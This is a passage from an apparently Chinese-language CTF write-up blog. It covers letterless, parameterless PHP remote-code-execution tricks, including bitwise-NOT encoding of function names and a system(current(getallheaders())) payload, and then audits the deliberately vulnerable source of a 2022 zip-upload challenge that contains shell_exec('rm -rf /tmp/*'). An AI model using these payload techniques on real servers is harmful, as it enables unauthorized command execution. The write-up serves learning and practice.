a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。\n大概是可以理解了\n\n再回头看这道题，就应该是无字母加上无参数rce一起上来\n我们先测试一下可用字符\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n\n有百分号和~\n取反\n&lt;?php$a=&quot;phpinfo&quot;;var_dump(urlencode(~$a));\n\n测试一手phpinfo\n\n一切都很顺利\n\n接下来开始准备rce\nsystem(current(getallheaders()));我们利用这一套修改信息头进行rce\n\n这里不断用脚本进行取反，然后%!FF或者!%FE都是为了给一个合法的函数名去补充，不然我们取反的函数字符字符串会被当作不合法的传入\n\n结束\n[鹏城杯 2022]压缩包 &lt;?phphighlight_file(__FILE__);function removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;function unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();        $zip-&gt;open($filename);        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;        if($zip-&gt;extractTo($dir))&#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);    ?&gt;[]Warning: mkdir(): No such file or directory in /var/www/html/index.php on line 21[][]\n\n开局很复杂吓人的源码\n代码审计\nfunction removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;\n\nscandir这个函数\n\n得到一个list\n然后去删除这些list里面的东西\n还有一个函数unzip($filename)\n待会分析\n$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);\n\n这是主要思路\n传入一个content\n然后删除tmp目录下面的所有东西，但是tmp目录还是在的\n/tmp/ 是一个 Linux&#x2F;Unix 系统中的临时目录，常用于存放临时文件，通常这些文件在系统重启时会被清空。\n然后他把$content经过md5后的文件名放到tmp文件路径下\n将 $content 变量中的 Base64 编码解码后，将结果写入到 $fpath 变量所代表的文件中，使用 PHP 内置函数 file_put_contents() 实现。具体的实现过程如下：\n\nbase64_decode($content) 将 $content 变量中的 Base64 编码解码成二进制数据\n\nfile_put_contents($fpath, ...) 将解码后的二进制数据写入到 $fpath 文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。\n\n\n最后echo了unzip函数里面的$fpath\n看看unzip函数\nfunction unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();//创建一个 ZipArchive 类的实例        $zip-&gt;open($filename);//打开，没有就创建        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);//在/static/upload/服务器的目录下面存入md5加密后的$filename        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;// 没有就创造        if($zip-&gt;extractTo($dir))//解压zip到dir        &#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);//unlink($filename) 方法用于删除 ZIP 文件，因为已经解压完成，ZIP 文件已经不需要了。        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;\n\n$zip = new ZipArchive(); 的作用是创建一个 ZipArchive 类的实例，以便使用该类提供的方法进行 ZIP 归档文件的操作。\n\nopen()：打开一个 ZIP 归档文件，如果文件不存在则创建它。\n\n分析完了什么都不懂。没有找到任何可用的点\n直接看wp，学习条件竞争\n","categories":["writeups"],"tags":["无参RCE","脏数据","取反构造","条件竞争","变量覆盖","路径穿越"]}]